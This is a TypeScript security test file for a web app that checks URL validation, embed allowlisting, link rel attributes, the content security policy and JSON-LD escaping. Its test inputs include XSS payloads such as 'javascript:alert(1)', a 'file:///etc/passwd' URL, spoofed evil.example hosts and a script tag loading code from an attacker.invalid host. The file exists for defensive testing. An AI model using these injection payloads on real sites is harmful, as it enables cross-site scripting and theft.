import assert from "node:assert/strict";
import {
  existsSync,
  readFileSync,
  readdirSync,
  type Dirent,
} from "node:fs";
import { join, relative } from "node:path";

import { customPageCreateSchema } from "../src/lib/custom-page-validation";
import { profileUpdateSchema } from "../src/lib/account-validation";
import { contentSecurityPolicy } from "../src/lib/csp";
import { firstPreviewUrl } from "../src/lib/link-preview";
import { embedUrlFromReplayPage } from "../src/lib/live/race-replay";
import { serializeJsonLd } from "../src/components/json-ld";
import { SECURITY_MASTER_EVIDENCE } from "../src/components/master-audit-evidence";
import {
  MASTER_AUDIT_REQUIREMENTS,
  isMasterRequirementComplete,
} from "../src/components/master-audit-requirements";
import {
  EXTERNAL_LINK_EMBED_MASTER_EVIDENCE,
  VERIFIED_EXTERNAL_LINK_EMBED_IDS,
} from "./external-link-embed-evidence";

const root = join(__dirname, "..");
const sourceExtensions = new Set([
  ".cjs",
  ".css",
  ".html",
  ".js",
  ".jsx",
  ".mjs",
  ".ts",
  ".tsx",
]);

type SourceFile = { path: string; source: string };

const productionSources = [
  ...collectSources("src"),
  ...collectSources("public"),
  readSource("next.config.ts"),
];

for (const unsafeUrl of [
  "javascript:alert(1)",
  "data:text/html,<script>alert(1)</script>",
  "file:///etc/passwd",
  "ftp://example.com/file",
]) {
  assert.equal(
    profileUpdateSchema.safeParse({
      displayName: "Safety reviewer",
      website: unsafeUrl,
    }).success,
    false,
    `profile website accepted ${unsafeUrl}`,
  );
  assert.equal(
    customPageCreateSchema.safeParse({
      pageType: "trainer",
      title: "Safety reviewer",
      website: unsafeUrl,
    }).success,
    false,
    `managed-page website accepted ${unsafeUrl}`,
  );
  assert.equal(firstPreviewUrl(`post ${unsafeUrl}`), null);
  assert.equal(embedUrlFromReplayPage(unsafeUrl), null);
}

assert.equal(
  profileUpdateSchema.safeParse({
    displayName: "Safety reviewer",
    website: "https://greyhoundsiq.com.au",
  }).success,
  true,
);
assert.equal(
  customPageCreateSchema.safeParse({
    pageType: "trainer",
    title: "Safety reviewer",
    website: "https://greyhoundsiq.com.au",
  }).success,
  true,
);
assert.equal(firstPreviewUrl("post https://example.com/story"), "https://example.com/story");

assert.deepEqual(
  embedUrlFromReplayPage("https://www.youtube.com/watch?v=abc12345"),
  {
    type: "youtube",
    embedUrl: "https://www.youtube-nocookie.com/embed/abc12345",
  },
);
assert.deepEqual(
  embedUrlFromReplayPage("https://www.youtube-nocookie.com/embed/abc12345"),
  {
    type: "youtube",
    embedUrl: "https://www.youtube-nocookie.com/embed/abc12345",
  },
);
assert.deepEqual(
  embedUrlFromReplayPage("https://player.vimeo.com/video/123456"),
  {
    type: "vimeo",
    embedUrl: "https://player.vimeo.com/video/123456",
  },
);
for (const rejectedEmbed of [
  "https://notyoutube.com/watch?v=abc12345",
  "https://youtube.com.evil.example/watch?v=abc12345",
  "https://player.vimeo.com.evil.example/video/123456",
  "https://user:secret@youtube.com/watch?v=abc12345",
  "ftp://youtube.com/watch?v=abc12345",
]) {
  assert.equal(
    embedUrlFromReplayPage(rejectedEmbed),
    null,
    `accepted non-allowlisted embed ${rejectedEmbed}`,
  );
}

const blankTargetTags = productionSources.flatMap(({ path, source }) =>
  [...source.matchAll(/<(?:a|Link)\b[^>]*\btarget\s*=\s*["']_blank["'][^>]*>/g)].map(
    ([tag]) => ({ path, tag }),
  ),
);
assert.ok(blankTargetTags.length >= 10, "expected production blank-target links");
for (const { path, tag } of blankTargetTags) {
  assert.match(
    tag,
    /\brel\s*=\s*["'][^"']*\b(?:noopener|noreferrer)\b[^"']*["']/,
    `${path}: blank target does not prevent opener access`,
  );
  assert.match(
    tag,
    /\brel\s*=\s*["'][^"']*\bnoreferrer\b[^"']*["']/,
    `${path}: blank target sends a referrer`,
  );
}

const replayPage = readSource("src/app/races/[id]/page.tsx").source;
assert.match(replayPage, /const trustedEmbed = embedUrlFromReplayPage\(embedUrl\)/);
assert.match(replayPage, /src=\{trustedEmbed\.embedUrl\}/);
assert.match(replayPage, /referrerPolicy="strict-origin-when-cross-origin"/);
assert.match(
  replayPage,
  /sandbox="allow-scripts allow-same-origin allow-presentation allow-popups"/,
);

const frameDirective = contentSecurityPolicy("external-link-evidence")
  .split(";")
  .map((directive) => directive.trim())
  .find((directive) => directive.startsWith("frame-src"));
assert.equal(
  frameDirective,
  "frame-src 'self' https://www.youtube-nocookie.com https://player.vimeo.com",
);

const dynamicScriptLoadPatterns = [
  /<Script\b/,
  /<script\b[^>]*\bsrc\s*=/i,
  /from\s+["']next\/script["']/i,
  /\b(?:import|require)\s*\(\s*["']next\/script["']/i,
  /createElement\(\s*["']script["']/i,
];
for (const { path, source } of productionSources) {
  for (const pattern of dynamicScriptLoadPatterns) {
    assert.doesNotMatch(source, pattern, `${path}: dynamic script loader found`);
  }
}
const dangerousHtmlFiles = productionSources
  .filter(({ source }) => source.includes("dangerouslySetInnerHTML"))
  .map(({ path }) => path);
assert.deepEqual(dangerousHtmlFiles, ["src/components/json-ld.tsx"]);
const encodedJsonLd = serializeJsonLd({
  value: "</script><script src=https://attacker.invalid/x.js></script>",
});
assert.doesNotMatch(encodedJsonLd, /<\/script|<script/i);
assert.match(encodedJsonLd, /\\u003c\/script/);

const remoteStaticAssetPatterns = [
  /<(?:script|Script)\b[^>]*\bsrc\s*=\s*(?:\{\s*)?["']https?:\/\//i,
  /<link\b[^>]*\bhref\s*=\s*(?:\{\s*)?["']https?:\/\//i,
  /@import\s+(?:url\(\s*)?["']?https?:\/\//i,
  /\bimport\s*\(\s*["']https?:\/\//i,
];
for (const { path, source } of productionSources) {
  for (const pattern of remoteStaticAssetPatterns) {
    assert.doesNotMatch(
      source,
      pattern,
      `${path}: static third-party script or stylesheet needs an SRI decision`,
    );
  }
}

const expectedIds = [
  ...VERIFIED_EXTERNAL_LINK_EMBED_IDS,
  "security.external-link-embed.sri",
];
assert.equal(expectedIds.length, 7);
for (const requirementId of expectedIds) {
  const requirement = MASTER_AUDIT_REQUIREMENTS.find(
    (candidate) =>
      candidate.prompt === "security" && candidate.id === requirementId,
  );
  assert.ok(requirement, `${requirementId}: missing immutable requirement`);
  assert.deepEqual(
    SECURITY_MASTER_EVIDENCE[requirementId],
    EXTERNAL_LINK_EMBED_MASTER_EVIDENCE[
      requirementId as keyof typeof EXTERNAL_LINK_EMBED_MASTER_EVIDENCE
    ],
  );
  assert.equal(isMasterRequirementComplete(requirement), true);
}

assert.equal(
  EXTERNAL_LINK_EMBED_MASTER_EVIDENCE["security.external-link-embed.sri"].status,
  "not-applicable-with-justification",
);
assert.match(
  EXTERNAL_LINK_EMBED_MASTER_EVIDENCE["security.external-link-embed.sri"]
    .notApplicableJustification,
  /no browser-fetched asset to which SRI can be applied/,
);

console.log(
  "external link and embed evidence passed: 6 verified controls; SRI not applicable with a source-scanned justification",
);

function collectSources(relativeRoot: string): SourceFile[] {
  const absoluteRoot = join(root, relativeRoot);
  if (!existsSync(absoluteRoot)) return [];
  const sources: SourceFile[] = [];
  walk(absoluteRoot, readdirSync(absoluteRoot, { withFileTypes: true }), sources);
  return sources;
}

function walk(directory: string, entries: Dirent[], sources: SourceFile[]) {
  for (const entry of entries) {
    const absolutePath = join(directory, entry.name);
    if (entry.isDirectory()) {
      walk(
        absolutePath,
        readdirSync(absolutePath, { withFileTypes: true }),
        sources,
      );
      continue;
    }
    if (
      !sourceExtensions.has(extension(entry.name)) ||
      /\.(?:test|spec)\.[^.]+$/.test(entry.name)
    ) {
      continue;
    }
    const path = relative(root, absolutePath).replaceAll("\\", "/");
    sources.push({ path, source: readFileSync(absolutePath, "utf8") });
  }
}

function readSource(path: string): SourceFile {
  return { path, source: readFileSync(join(root, path), "utf8") };
}

function extension(filename: string) {
  const dot = filename.lastIndexOf(".");
  return dot === -1 ? "" : filename.slice(dot);
}
